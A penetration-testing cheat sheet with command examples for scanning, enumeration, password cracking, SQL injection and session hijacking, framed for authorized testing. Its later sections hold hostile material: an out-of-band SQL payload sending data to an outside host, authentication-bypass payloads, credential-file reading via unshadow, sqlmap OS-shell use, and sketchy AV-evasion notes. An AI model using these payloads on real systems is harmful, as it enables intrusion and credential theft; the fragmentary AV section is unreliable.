# Ethical Hacking Tool Repository

This repository provides a curated collection of tools used for various **Ethical Hacking** and **Penetration Testing** activities. Each major discipline of ethical hacking is organized into a dedicated section, including a selection of commonly used tools and practical examples demonstrating their usage.

The repository is intended to serve as a concise and practical *reference guide* (cheat sheet) that can be readily consulted during penetration testing engagements, security assessments, Capture The Flag (CTF) competitions, and other authorized offensive security activities.

This repository covers the following areas:

- [Fingerprinting](#fingerpriting)
- [Exploitation](#exploitation)
- [Post-Exploitation](#post-exploitation)

## Fingerprinting

Fingerprinting refers to the systematic process of collecting information about a target system through direct or indirect interaction during an ethical hacking or penetration testing engagement. It includes both **passive** and **active reconnaissance** techniques and aims to identify technical and contextual characteristics of the target. These characteristics may include the operating system, network architecture, open ports, exposed services, software versions, and application behavior.

**Passive fingerprinting** consists of gathering information without directly interacting with the target system. This approach typically involves the analysis of publicly available data sources, metadata, DNS records, or network traffic that is already being transmitted. Passive techniques are considered stealthy, as they do not generate additional traffic or detectable activity on the target infrastructure.

**Active fingerprinting**, by contrast, requires direct interaction with the target system. Controlled probes and requests are sent in order to trigger responses that disclose further technical details. While active techniques generally provide more precise and comprehensive information, they may generate logs or alerts. For this reason, such techniques must only be conducted with explicit authorization.

This section covers the following categories of fingerprinting techniques:

- [Web Browser Analysis](#web-browser-analysis)
- [Scanning](#scanning)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Enumeration](#enumeration)

### Web Browser Analysis

Although it may not be immediately apparent, modern web browsers provide a wide range of built-in tools that can be leveraged to analyze a website and, by extension, the service hosting it.

All major web browsers include **Developer Tools**, commonly accessible through the *Inspect* option. These tools enable the examination of HTML, CSS, and JavaScript source code, the inspection of network requests, the analysis of session cookies and local storage, and interaction with a JavaScript console capable of executing arbitrary client-side code. In principle, these features are designed to expose only resources that the user is already authorized to access locally. For example, JavaScript code is executed on the client side, and cookies are restricted to the user’s own session data. As a result, Developer Tools are not inherently intended to compromise application security.

From an ethical hacking perspective, however, the information exposed through Developer Tools can be highly valuable. The analysis of client-side logic, cookie structures, request parameters, and input handling mechanisms may provide insight into the internal behavior of the application. Such information can reveal weaknesses in areas such as session management, input validation, or access control, potentially enabling the identification of functionality that can be misused beyond its intended scope.

Typical analysis activities performed using Developer Tools include:

- Reviewing JavaScript files to identify hidden functionality or client-side validation logic  
- Inspecting HTTP requests and responses to observe parameters, headers, and authentication tokens  
- Examining cookies and local storage entries to understand session handling mechanisms  
- Observing API endpoints accessed by the application during normal user interaction  

In addition to built-in Developer Tools, various browser extensions can further assist in web application fingerprinting by revealing underlying technologies or altering request behavior. Commonly used extensions include:

- **FoxyProxy** – Enables rapid switching between proxy configurations, facilitating the interception and analysis of HTTP and HTTPS traffic through external tools.  
- **User-Agent Switcher and Manager** – Allows modification of the User-Agent header to simulate access from different browsers, operating systems, or devices.  
- **Wappalyzer** – Detects and reports technologies used by a website, including web frameworks, content management systems, server software, and analytics platforms.

### Scanning

Scanning is the process of systematically identifying active components within a target environment, such as live hosts, reachable network paths, open ports, and exposed services. This phase provides a clearer technical view of the target system and helps define the potential attack surface prior to exploitation.

Several common scanning techniques include:
- [Ping Sweep](#ping-sweep)
- [ARP Sweep](#arp-sweep)
- [Traceroute](#traceroute)
- [DNS Enumeration](#dns-enumeration)
- [War Driving](#war-driving)
- [Port Scanning](#port-scanning)

#### Ping Sweep

A ping sweep is a technique used to determine which hosts within a given IP address range are active. It works by sending ICMP Echo Request packets to multiple addresses and analyzing the responses. Hosts that reply are considered reachable, allowing the tester to identify live systems on a network. While simple and fast, ping sweeps may be unreliable in environments where ICMP traffic is filtered or blocked.

The following tools can be used to perform ping sweep operations:

- `ping` : The `ping` utility is a basic network diagnostic tool used to test the reachability of a single host by sending ICMP Echo Requests and measuring response times. While not designed for large-scale sweeps, it is useful for validating connectivity to individual systems.

```bash
# Ping a machine indefinitely until manually stopped
ping 8.8.8.8

# Send 10 ICMP Echo Requests (Linux / macOS)
ping -c 10 example.com

# Send 10 ICMP Echo Requests (Windows)
ping -n 10 10.0.0.1

# Send ICMP packets with a payload size of 32 bytes (40 bytes including header)
ping -s 32 8.8.8.8
```

- `fping` : The `fping` tool is an enhanced version of `ping` optimized for scanning multiple hosts in parallel. It is particularly effective for performing fast ping sweeps across IP ranges or host lists.

```bash
# General command usage
fping <options> {MACHINE_IP | HOSTNAME}

# Commonly used attributes
-a                 # Display only hosts that are alive
-u                 # Display only unreachable hosts
-c <count>         # Number of echo requests to send per host
-t <timeout>       # Timeout in milliseconds to wait for a reply
-r <retries>       # Number of retries before marking a host unreachable
-s                 # Display summary statistics
-e                 # Show elapsed time for each response
-f <file>          # Read target hosts from a file
-g 192.168.1.0/24  # Generate and scan a target IP range
-I <interface>     # Specify the network interface to use
-S <src>           # Set a custom source IP address
-q                 # Suppress per-host output (useful for scripting)
-N                 # Disable DNS resolution
```

- `nmap` : Although primarily known for port scanning, `nmap` can also be used for host discovery by performing ping sweeps using its no port scan mode. This method leverages multiple discovery probes, making it more flexible than traditional ICMP-only approaches.

```bash
# Ping sweep against a single target
nmap -sn 192.168.1.134

# Ping sweep over an IP range
nmap -sn 192.168.1.10-50

# Ping sweep using CIDR notation
nmap -sn 192.168.1.0/24

# Ping sweep against a list of specific IP addresses
nmap -sn 192.168.1.1 192.168.1.3 192.168.1.4
```

#### ARP Sweep

An ARP sweep is a host discovery technique used primarily within local area networks (LANs). It operates by sending Address Resolution Protocol (ARP) requests to determine which IP addresses are actively associated with MAC addresses on the local network. Because ARP traffic is required for normal network operation and is typically not filtered within the same broadcast domain, ARP sweeps are generally more reliable than ICMP-based methods for identifying live hosts on a LAN.

- `arp-scan`: The `arp-scan` is a command-line network scanning tool specifically designed to perform ARP-based host discovery. It sends ARP request packets to target IP addresses and analyzes the replies to identify active devices, their IP addresses, and corresponding MAC addresses. Due to its reliance on Layer 2 communication, `arp-scan` is effective only within the local network segment and cannot be used to scan remote networks beyond the broadcast domain.

```bash
# Scan the local network associated with the active interface
arp-scan --localnet

# Scan a specific subnet
arp-scan 192.168.0.0/24

# Perform an ARP sweep using a specified network interface
arp-scan --interface=eth0 192.168.0.0/24

# Scan a defined IP address range
arp-scan 10.0.0.1-10.0.0.50
```

#### Traceroute

Traceroute is a network diagnostic technique used to determine the path that packets take from a source system to a target host. By analyzing the sequence of intermediate routers (hops) and their response times, traceroute helps map network topology, identify routing issues, potential choke points, firewalls, or filtering devices. It is a valuable tool for understanding network structure, troubleshooting connectivity, and assessing defensive boundaries.

- `traceroute` (Linux / macOS): The `traceroute` command sends packets with incrementally increasing Time-To-Live (TTL) values to elicit responses from each hop along the route to the destination. Each hop responds with its IP address and round-trip time, allowing mapping of the path.

```bash
# Trace the route to a target host by hostname
traceroute example.com

# Trace the route to a target host by IP address
traceroute 8.8.8.8

# Limit the maximum number of hops
traceroute -m 20 example.com

# Change the number of probe packets per hop
traceroute -q 5 example.com

# Use ICMP ECHO instead of UDP probes
sudo traceroute -I example.com

# Resolve all addresses to numeric IPs only (disable DNS lookup)
traceroute -n example.com

# Force traceroute to use only IPv4 addresses
traceroute -4 8.8.8.8
```

- `tracert` (Windows): The Windows equivalent of traceroute, `tracert`, works similarly by sending ICMP Echo Request packets with increasing TTL values. Each responding router along the path provides its address and response time.

```bash
# Trace the route to a target host by hostname
tracert example.com

# Trace the route to a target host by IP address
tracert 8.8.8.8

# Limit the maximum number of hops
tracert -h 20 example.com

# Set the timeout for each reply in milliseconds
tracert -w 200 example.com

# Do not resolve IP addresses to hostnames
tracert -d example.com

# Force tracert to use only IPv4 addresses
tracert -4 -h 15 example.com
```

#### DNS Enumeration

DNS enumeration is the process of collecting information from the Domain Name System in order to identify hostnames, subdomains, IP addresses, and DNS records associated with a target domain. By querying DNS servers and analyzing their responses, additional infrastructure can be uncovered, including mail servers, development systems, staging environments, or internal naming conventions. This information is essential for expanding the attack surface during reconnaissance.

- `dig`: The `dig` (Domain Information Groper) command is a flexible DNS query tool used to retrieve specific DNS records directly from name servers. It provides detailed, low-level output and is commonly used for manual DNS analysis and troubleshooting.

```bash
# Query A records for a domain
dig example.com A

# Query MX (mail server) records
dig example.com MX

# Query name server records
dig example.com NS

# Query TXT records
dig example.com TXT

# Perform a reverse DNS lookup
dig -x 8.8.8.8

# Attempt a DNS zone transfer from a specific name server
dig @ns1.example.com example.com AXFR
```

- `nslookup`: This command is an interactive DNS query tool available on most operating systems. It is commonly used for basic DNS resolution and quick record lookups.

```bash
# Resolve a domain to its IP address
nslookup example.com

# Query MX records
nslookup -type=MX example.com

# Query name server records
nslookup -type=NS example.com

# Perform a reverse DNS lookup
nslookup 8.8.8.8

# Query a specific DNS server
nslookup example.com 8.8.8.8
```

- `dnsenum`: is an automated DNS enumeration tool designed to discover subdomains, hostnames, and DNS records using brute-force techniques and zone transfer attempts.

```bash
# Perform basic DNS enumeration
dnsenum example.com

# Use a custom wordlist for subdomain brute-forcing
dnsenum example.com -f subdomains.txt

# Enumerate with Google scraping disabled
dnsenum example.com --noreverse

# Specify a DNS server to query
dnsenum example.com --dnsserver 8.8.8.8
```

- `host`: The `host` command is a simple DNS lookup utility used to resolve domain names, perform reverse lookups, and retrieve specific DNS records.

```
# Resolve a domain name to an IP address
host example.com

# Query MX records
host -t MX example.com

# Query name server records
host -t NS example.com

# Perform a reverse DNS lookup
host 8.8.8.8

# Resolve a specific subdomain
host vpn.example.com
```

#### War Driving

War driving is a reconnaissance technique focused on identifying and analyzing wireless networks within a physical area. It involves scanning for Wi‑Fi access points while moving through an environment and collecting information such as network names (SSIDs), BSSIDs, encryption types, channels, and signal strength. This technique is commonly used to assess the security posture, coverage, and exposure of wireless infrastructures.

- `airodump-ng`: is a wireless packet capture and monitoring tool that is part of the Aircrack‑ng suite. It passively captures IEEE 802.11 frames to identify nearby access points and connected clients, making it particularly useful for wireless reconnaissance and data collection during war driving activities.

```bash
# Start monitoring all nearby wireless networks
airodump-ng wlan0mon

# Monitor networks on a specific channel
airodump-ng --channel 6 wlan0mon

# Write captured packets to files for later analysis
airodump-ng --write wardrive_capture wlan0mon

# Monitor a specific access point by BSSID
airodump-ng --bssid 00:11:22:33:44:55 wlan0mon

# Monitor a specific access point and channel while saving packets
airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write ap_capture wlan0mon
```

- `wifite`: is an automated wireless auditing tool designed to simplify the discovery and assessment of wireless networks. It integrates multiple tools to scan for nearby access points, identify encryption types, and perform automated attacks where authorized, making it useful for rapid assessment during wireless reconnaissance.

```bash
# Scan for nearby wireless networks
wifite

# Scan only WPA/WPA2 protected networks
wifite --wpa

# Scan only WEP protected networks
wifite --wep

# Use a specific wireless interface
wifite -i wlan0mon

# Enable verbose output for detailed analysis
wifite --verbose
```

#### Port Scanning

Port scanning is the process of probing a target system to identify open, closed, or filtered network ports. Each open port may correspond to an exposed service or application and represents a potential entry point for further analysis. Port scanning is a critical step in reconnaissance, as it provides essential information for service enumeration, version detection, and vulnerability assessment.

- `nmap`  
  `nmap` (Network Mapper) is a widely used network scanning tool designed to discover open ports, identify services, detect operating systems, and perform advanced scanning techniques. It supports multiple scan types and extensive customization, allowing detailed analysis of a target’s exposed network surface.

```bash
# Scan the default top 1000 TCP ports
nmap 192.168.1.10

# Scan a specific set of ports
nmap -p 22,80,443 192.168.1.10

# Scan a port range
nmap -p 1-1024 192.168.1.10

# Scan all 65535 TCP ports
nmap -p- 192.168.1.10

# Scan both TCP and UDP ports
nmap -sS -sU -p 53,67,68,123 192.168.1.10
```

```bash
# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.10

# TCP connect scan
nmap -sT 192.168.1.10

# UDP scan
nmap -sU 192.168.1.10

# TCP ACK scan (firewall rule detection)
nmap -sA 192.168.1.10

# TCP FIN scan
nmap -sF 192.168.1.10

# TCP NULL scan
nmap -sN 192.168.1.10

# TCP XMAS scan
nmap -sX 192.168.1.10
```

```bash
# Detect service versions
nmap -sV 192.168.1.10

# Enable default NSE scripts
nmap -sC 192.168.1.10

# Run specific NSE scripts
nmap --script=http-enum 192.168.1.10

# Combine service detection and scripts
nmap -sV -sC 192.168.1.10
```

```bash
# Perform an idle (zombie) scan using a third-party host
nmap -sI 192.168.1.20 192.168.1.10
```

### Vulnerability Analysis

After identifying potential entry points and collecting technical information during the scanning phase, the next step is to analyze possible vulnerabilities that may be exploited within the discovered attack surface. Vulnerability analysis focuses on identifying known weaknesses in systems, services, and applications in order to assess risk and guide further exploitation or mitigation efforts.

#### Standard Frameworks

In cybersecurity, standardized frameworks exist to catalog and describe known vulnerabilities and weaknesses. These frameworks provide a common language and reference model for identifying, classifying, and researching security issues based on observed system characteristics.

The most widely used frameworks include:

- **Common Weakness Enumeration (CWE)**  
  CWE is a comprehensive list of software and hardware weakness types. It focuses on underlying design and implementation flaws that may lead to vulnerabilities and is useful for understanding root causes and attack patterns.  
  Reference: https://cwe.mitre.org/

- **Common Vulnerabilities and Exposures (CVE)**  
  CVE is a publicly available catalog of specific, real-world vulnerabilities. Each CVE entry describes a known vulnerability in a product or system and is commonly referenced by security tools, advisories, and patches.  
  Reference: https://www.cve.org/

These frameworks enable security professionals to map discovered services and software versions to known weaknesses and documented exploits.

#### Nessus

Nessus is a widely used vulnerability assessment tool that provides a graphical user interface for scanning hosts and identifying known vulnerabilities. It performs automated checks against systems and services and correlates findings with CVE and CWE databases to produce detailed vulnerability reports.

Nessus Essentials is a free version suitable for learning and small-scale assessments.

Reference: https://www.tenable.com/products/nessus/nessus-essentials

Once installed and running, the Nessus web interface can typically be accessed locally at:

https://localhost:8043

Through the interface, scan policies can be configured, targets defined, and results reviewed in a structured and prioritized manner.

#### OpenVAS

OpenVAS (Open Vulnerability Assessment System) is an open-source vulnerability scanning framework that performs automated security assessments. It identifies vulnerabilities by scanning target systems and correlating findings with known vulnerability databases.

One common method to deploy OpenVAS is through a Docker container, which simplifies setup and configuration.

```bash
# Install Docker
sudo apt install docker.io

# Pull and run the OpenVAS Docker container
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```

After the container is running, the OpenVAS web interface can be accessed via a web browser:

https://127.0.0.1

Default credentials (for initial access):

- Username: `admin`
- Password: `admin`  

Once authenticated, scan tasks can be created to assess target hosts, and findings are automatically linked to known vulnerabilities for further analysis and remediation planning.

### Enumeration

Enumeration is the phase that follows scanning and vulnerability analysis. At this stage, the objective is to collect as much detailed and precise information as possible about the target systems based on the previously identified structure and attack surface.

This process includes identifying running services and their versions, operating system details, supported protocols, user accounts, network shares, and service-specific configurations. Enumeration refines earlier findings and helps accurately confirm real and exploitable vulnerabilities, reducing false assumptions and improving attack precision.

- `telnet`: is a network protocol that establishes a raw TCP connection to a specified host and port, allowing direct interaction with the service. Upon connection, normally, most services will output a banner with information on the running services.

```bash
# Connect to a remote service using Telnet
telnet 192.168.1.10 80

# Manually send an HTTP request to retrieve server headers
GET / HTTP/1.1
Host: example.com

# Useful commonly used ports
25 -> SMTP
21 -> FTP
110 -> POP3
143 -> IMAP
22 -> SSH
443 -> HTTPS
53 -> DNS
80 -> HTTP
```

- `nc`: Netcat provides low-level access to network connections and is widely used for enumeration and testing service behavior. It is capable of acting as both a client and a server using TCP or UDP.

```bash
# Connect to a remote TCP service
nc 192.168.1.10 80

# Start a TCP listener on port 1234
nc -l -p 1234

# Start a persistent listener that remains active after disconnects
nc -l -p 1234 -k

# Enable verbose output
nc -v 192.168.1.10 21

# Enable very verbose output
nc -vv 192.168.1.10 21

# Disable DNS resolution and use numeric IP addresses only
nc -n 192.168.1.10 22
```

- `nbtscan`: is a NetBIOS enumeration tool used in Windows-based networks. It queries NetBIOS Name Service (NBNS) to retrieve information about hosts, including computer names, IP addresses, workgroups or domains, and logged-in users. It is particularly useful when SMB-related ports are exposed.

```bash
# Scan a subnet for NetBIOS information
nbtscan 192.168.1.0/24

# Perform a verbose scan
nbtscan -v 192.168.1.0/24
```

- `enum4linux`: is an automated enumeration tool for Windows and Samba systems. It leverages SMB and RPC services to gather detailed information such as user accounts, groups, shared resources, password policies, and domain information.

```bash
# Perform basic SMB enumeration
enum4linux 192.168.1.20

# Perform full enumeration
enum4linux -a 192.168.1.20

# Enumerate users only
enum4linux -U 192.168.1.20

# Enumerate shares
enum4linux -S 192.168.1.20
```

- `name_snoop`: is a DNS enumeration tool designed to discover valid hostnames by analyzing DNS responses. It can reveal internal naming patterns and additional subdomains.

```bash
# Enumerate hostnames for a domain
name_snoop example.com
```

- `smtp_user_enum`: is used to identify valid email users on SMTP servers by issuing mail-related commands and observing server responses.

```bash
# Enumerate users using the VRFY command
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.30

# Enumerate users using the RCPT command
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.30
```

- `snmp-check`: is an SNMP enumeration tool that extracts detailed information from SNMP-enabled devices when a valid community string is known or guessed.

```bash
# Enumerate SNMP information using the default community string
snmp-check 192.168.1.40

# Specify a community string
snmp-check -c public 192.168.1.40
```

- `nmap`: includes NSE scripts specifically designed for SNMP enumeration, allowing structured data extraction from network devices.

```bash
# Enumerate SNMP system information
nmap -sU -p 161 --script=snmp-info 192.168.1.40

# Enumerate SNMP interfaces and routing information
nmap -sU -p 161 --script=snmp-interfaces,snmp-netstat 192.168.1.40
```

## Exploitation

Once we have all the information we could gather about a system, the next phase consists in trying to exploit said system.

There are a lot of entry points and exploits that we can use, and the best choices will depend on the information we found. Normally we want to try and start to exploit the attack vector that seems more vunerable and potentially will detect less our activities.

There are several exploit disciplines such as:
- [Intrusion](#intrusion)
- [Client Side Exploitation](#client-side-exploitation)
- [AntiVirus Evasion](#antivirus-evasion)
- [Password Attacks](#password-attacks)
- [Web Exploitation](#web-exploitation)
- [Privilege Escalation](#privilege-escalation)

### Password Attacks

#### Wordlists

- `cewl`: is a custom wordlist generator that crawls a website and extracts unique words from its content. It is commonly used in security assessments and password auditing to create targeted wordlists based on a specific domain.

```bash
# Crawl a website and save all discovered words
cewl -w wordlist.txt https://example.com

# Crawl up to 3 levels deep and extract words with at least 5 characters
cewl -w example_words.txt -d 3 -m 5 https://example.com

# Crawl a specific section of a site with deeper recursion
cewl -w blog_words.txt -d 4 -m 6 https://example.com/blog

# Use a custom User-Agent and allow crawling sites with SSL issues
cewl -w secure_words.txt -d 2 -m 4 --user-agent "Mozilla/5.0" --ssl https://secure.example.com

# Include words containing numbers (useful for usernames or password patterns)
cewl -w mixed_words.txt -d 3 -m 5 --with-numbers https://portal.example.com
```

- `crunch`: is a wordlist generator that creates lists based on all possible combinations of characters. It is commonly used for password cracking, brute-force attacks, and security research where controlled and predictable wordlists are required.

```bash
# Generate a wordlist using all possible character combinations
# Syntax: crunch <min_length> <max_length> <character_set> -o <output_file>
crunch 4 6 abc123 -o wordlist.txt

# Generate numeric-only passwords between 6 and 8 characters
crunch 6 8 0123456789 -o pin_codes.txt

# Generate lowercase alphabetic passwords of fixed length
crunch 8 8 abcdefghijklmnopqrstuvwxyz -o lowercase_8.txt

# Generate a wordlist using a custom character set
crunch 5 7 abdc232214snfs2rmfdsn -o custom_chars.txt

# Use the -t option to define a structured password pattern
# @ = lowercase letters, , = uppercase letters, % = numbers, ^ = special characters

# Example: "pass" followed by two numbers (pass00 → pass99)
crunch 6 6 -t pass%% -o pass_numbers.txt

# Example: name + lowercase letter + number (namea0 → namez9)
crunch 6 6 -t name@% -o name_variations.txt

# Example: Uppercase letter + 3 numbers + special character
crunch 5 5 -t ,%%%^^ -o complex_patterns.txt
```

- `cupp`: is a user-profiling wordlist generator that creates targeted password lists based on personal information such as names, nicknames, birthdays, relationships, and common patterns. It is widely used in social-engineering–focused security assessments.

```bash
# Get the generator from the git repository
git clone https://github.com/Mebus/cupp.git
```

```bash
# Run CUPP in interactive mode (prompts for user information)
python3 cupp.py -i

# Example interactive inputs (used internally by CUPP):
# Name: john
# Surname: doe
# Nickname: jd
# Birthdate: 01011995
# Partner name: jane
# Pet name: max
# Company: acme

# Show help and available options
python3 cupp.py -h

# Generate a wordlist using a predefined profile (no interaction)
python3 cupp.py -w profiles/john.txt

# Improve wordlist with leetspeak, special characters, and numbers
python3 cupp.py -i --leet --specialchars
```

- `username_generator`: is a username generation tool that creates possible username variations based on personal information such as names, nicknames, dates, and common patterns. It is useful for reconnaissance, account enumeration, and security assessments.

```bash
# Get the generator from the git repository
git clone https://github.com/therodri2/username_generator.git
```

```bash
# Display all available options
python3 username_generator.py -h

# Generate usernames using a first and last name
python3 username_generator.py -f John -l Doe

# Generate usernames with a nickname and common separators
python3 username_generator.py -n johnd -s "_."

# Include numbers such as birth year or common suffixes
python3 username_generator.py -f John -l Doe -y 1995 -r 0 99

# Generate lowercase-only usernames and save to a file
python3 username_generator.py -f John -l Doe --lower -o usernames.txt

# Generate usernames combining name, nickname, and custom domain-style format
python3 username_generator.py -f John -l Doe -n johnny -d example
```

#### Online Attacks

- `hydra`: is a fast, parallelized login brute-force tool that supports numerous network services and protocols such as FTP, SSH, SMTP, HTTP, and more. It is commonly used for credential auditing and penetration testing.

```bash
# FTP brute-force attack using a single username and a password list
hydra ftp.example.com -l admin -P rockyou.txt ftp

# SMTP brute-force attack using an email address
hydra mail.example.com -l user@example.com -P passwords.txt smtp

# SSH brute-force attack using multiple usernames and a password list
hydra ssh.example.com -L users.txt -P passwords.txt ssh

# HTTP POST login brute-force attack
# Format: hydra <host> <request-type> -l/-L <user(s)> -p/-P <password(s)> "<path:parameters:condition>"
hydra www.example.com http-post-form \
"/login.php:username=^USER^&password=^PASS^:F=Invalid login" \
-l admin -P passwords.txt

# HTTP GET login brute-force attack with success condition
hydra www.example.com http-get-form \
"/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" \
-l admin -P passwords.txt

# Stop attack after first valid credential is found and enable verbose output
hydra ssh.example.com -L users.txt -P passwords.txt ssh -f -v
```

#### Offline Attacks

- `hash-id`: is a hash identification tool used to determine the possible algorithm(s) used to generate a given hash. It helps narrow down the correct cracking approach by suggesting compatible hash types for tools like John the Ripper and Hashcat.

```bash
# Download the hash-id script
wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
```

```bash
# Run hash-id in interactive mode
python3 hash-id.py

# Example usage (interactive):
# Enter hash: 5f4dcc3b5aa765d61d8327deb882cf99
# Possible hash types:
#  - MD5
#  - MD4
#  - NTLM

# Identify a hash non-interactively using stdin
echo "098f6bcd4621d373cade4e832627b4f6" | python3 hash-id.py
```

- `hashcat`: is a high-performance password recovery tool that supports multiple attack modes such as dictionary, brute-force, mask, and hybrid attacks. It is widely used for password auditing, digital forensics, and security testing across many hash algorithms.

```bash
# Basic dictionary attack
# -a 0 = straight (dictionary) attack
# -m 0 = MD5 hash mode
hashcat -a 0 -m 0 hashes.txt rockyou.txt

# Brute-force (mask) attack – list all possible 4-digit numeric combinations
# --stdout outputs candidates without cracking
hashcat -a 3 ?d?d?d?d --stdout

# Brute-force attack against a hash using a 4-digit numeric mask
# -a 3 = mask attack
# -m 1000 = NTLM hash mode
hashcat -a 3 -m 1000 hashes.txt ?d?d?d?d

# Hybrid attack: wordlist + mask
# -a 7 = append mask to each word in the wordlist
# Example: password + 2 digits (password00 → password99)
hashcat -a 7 -m 0 hashes.txt rockyou.txt ?d?d

# Show cracked hashes (successful results only)
hashcat -a 0 -m 0 hashes.txt rockyou.txt --show

# Display help, supported hash modes, and attack options
hashcat -h
```

- `john` (John the Ripper): is a password cracking and auditing tool that supports dictionary, brute-force, mask, hybrid, and rule-based attacks. It is commonly used in penetration testing, forensics, and system security audits across many hash formats.

```bash
# Basic execution using default attack modes
john hashes.txt

# Dictionary attack with a specific wordlist
john --wordlist=rockyou.txt hashes.txt

# Dictionary attack specifying the hash format
# Example: raw-md5
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

# List all supported hash formats
john --list=formats

# Brute-force / mask attack
# Example: 4-digit numeric passwords
john --mask=?d?d?d?d --format=NT hashes.txt

# Show cracked passwords (if any)
john --format=raw-md5 --show hashes.txt

# Single crack mode (uses username and related info)
john --single --format=raw-md5 hashes_with_users.txt

# Single crack mode with a custom rule
john --single --rule=Jumbo --format=raw-md5 hashes_with_users.txt

# Dictionary attack with a custom rule applied to each word
john --wordlist=rockyou.txt --rule=Best64 --format=raw-md5 hashes.txt

# Print all generated candidates instead of cracking
john --mask=?l?l?l?l --stdout
```

```bash
# Configuration of custom rules in /etc/john/john.conf

# Custom John rules for targeted password mutations
[List.Rules:TargetedRules]

# Base word
Az

# Append common numbers
Az"1"
Az"123"
Az"2024"

# Prepend common prefixes
^Admin Az
^! Az

# Capitalize first letter and append number
c Az"1"

# Replace letters (leet-style)
s a @
s e 3
s i 1
s o 0

# Rule syntax basics
Az        → base word from wordlist
"123"     → append characters to the end
^Admin    → prepend characters to the beginning
c         → capitalize first letter
u         → uppercase all letters
l         → lowercase all letters
r         → reverse the word
s x y     → substitute character x with y
```

```bash
# Combine passwd and shadow files (Linux systems)
unshadow /etc/passwd /etc/shadow > unshadowed_hashes.txt

# Extract hashes from protected files

# ZIP archive
zip2john secret.zip > zip_hash.txt

# RAR archive
rar2john secret.rar > rar_hash.txt

# SSH private key
ssh2john id_rsa > ssh_hash.txt
```

```bash
# Hash file with user information (e.g., unshadow output)
username:$6$somesalt$hashedpassword
```

Antivirus

ClamAV: https://www.clamav.net/
VirusTotal: https://www.virustotal.com/gui/home/upload
Jotti VirusScan: https://virusscan.jotti.org/ (Does not share with AV companies)

Signature based open source Antivirus

```
clamscan path/to/scan -> scan a folder
sigtool --{hash algorithm} path/to/file -> generate the hash signature of a file
clamscan -d path/to/custom/signaturedatabase path/to/scan

yara database -> a file with rules in yara formats, a file is considered malware if it matches the rules in the database
database -> a file with signatures separated by \n
--debug -> show more information
```

Fingerpriting Antivirus and other services

SharpEDRChecker: https://github.com/PwnDexter/SharpEDRChecker

Analyze the contents of a file

HxD application -> https://mh-nexus.de/en/hxd/

PE-Bear: (Analyze windows PE strucuture)
```
strings path/to/file -> outputs all human readable strings
```

Compile assembly code

```
write assembly code
nasm -f <system type (32 or 64)> path/to/code -> o
ld path/to/o -o future/exec -> exec
objdump -d file/to/dump -> shellcode (binary)
objcopy -j .text -O binary <exec> <exec>.text -> text file
xxd -i <exec>.txt -> binary in C code
xxd -i <bin>.bin -> binary in C code

in c:

(*(void(*)())message)();
```

Evasion of AV

Encoding & Decryption

Packers

ConfuserEx

Binders -> Merge two programs

### Web Exploitation

#### SQL Injection

- `sql` (SQL Injection context): refers to Structured Query Language statements and payloads used to interact with databases. In a security-testing context, these examples demonstrate how improperly handled input can be abused to manipulate queries, bypass authentication, or extract unauthorized data.

```sql
-- Typical database query fetching user information
SELECT u_name, u_age, u_email
FROM users
WHERE u_id = '$Id';

-- Typical database login query (vulnerable if inputs are not sanitized)
SELECT *
FROM users
WHERE u_email = '$Email'
  AND u_password = '$Password';
```

```
# UNION-based payloads (data extraction)

# Extract additional columns from the same table
$Id=1' UNION SELECT u_name, u_password, u_address FROM users -- 

# Generic UNION structure (column count must match original query)
{value}' UNION SELECT col1, col2, col3 FROM target_table -- 
```

```
# Authentication bypass payloads (login manipulation)

# Bypass login to impersonate admin
$Email=admin@email.com'; -- 

# Generic authentication bypass
{target_user}'; -- 
```

```
# Boolean-based payload (confirming injection via true/false behavior)
$Id=1' AND ASCII(SUBSTRING(username,1,1)) = 97 -- 

# Time-based payload (confirming injection via response delay)
$Id=10' AND IF(version() LIKE '5%', SLEEP(10), 0) -- 

# Error-based payload (forcing database error output)
$Id=10' OR UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL)) -- 

# Out-of-band (OOB) payload (external interaction)
$Id=10' OR UTL_HTTP.request('http://testerserver.com:80/' || (SELECT user FROM DUAL)) -- 
```

- `sqlmap`: is an automated SQL injection detection and exploitation tool that identifies vulnerable parameters and can extract database information, dump data, read/write files, and execute OS commands depending on the database and configuration. It is widely used in penetration testing and security research.

```bash
# Basic SQL injection test against a URL with a vulnerable parameter
sqlmap -u "http://example.com/item.php?id=1"

# Specify a GET parameter explicitly
sqlmap -u "http://example.com/item.php?id=1" -p id

# Test a POST request (login form)
sqlmap -u "http://example.com/login.php" \
--data="username=admin&password=admin" \
-p username,password

# Use a saved HTTP request from Burp or a proxy
sqlmap -r request.txt

# Enumerate available databases
sqlmap -u "http://example.com/item.php?id=1" --dbs

# List tables from a specific database
sqlmap -u "http://example.com/item.php?id=1" -D shop_db --tables

# List columns from a specific table
sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users --columns

# Dump data from a specific table
sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users --dump

# Dump only specific columns
sqlmap -u "http://example.com/item.php?id=1" -D shop_db -T users -C username,password --dump

# Automatically detect and exploit injection with higher intensity
sqlmap -u "http://example.com/item.php?id=1" --level=5 --risk=3

# Use a specific injection technique (Boolean-based)
sqlmap -u "http://example.com/item.php?id=1" --technique=B

# Bypass simple WAFs using tamper scripts
sqlmap -u "http://example.com/item.php?id=1" --tamper=space2comment

# Attempt OS command execution (if supported)
sqlmap -u "http://example.com/item.php?id=1" --os-shell

# Identify the backend DBMS only
sqlmap -u "http://example.com/item.php?id=1" --banner
```

#### Session Hijacking

- `custom_script.py`: is a custom Python script that uses the requests library to send HTTP requests with manually defined cookies. It is commonly used to automate session replay, test session hijacking scenarios, and validate authentication or authorization behavior programmatically.

```python
import requests

# Target URL that requires an authenticated session
url = "https://example.com/dashboard"

# Custom cookies (e.g., stolen, reused, or manually crafted session values)
cookies = {
    "sessionid": "123456",
    "user": "alice"
}

# Optional custom headers
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html"
}

# Send GET request with cookies and headers
response = requests.get(url, cookies=cookies, headers=headers, timeout=10)

# Basic response handling
print("Status code:", response.status_code)
print("Response length:", len(response.text))
```

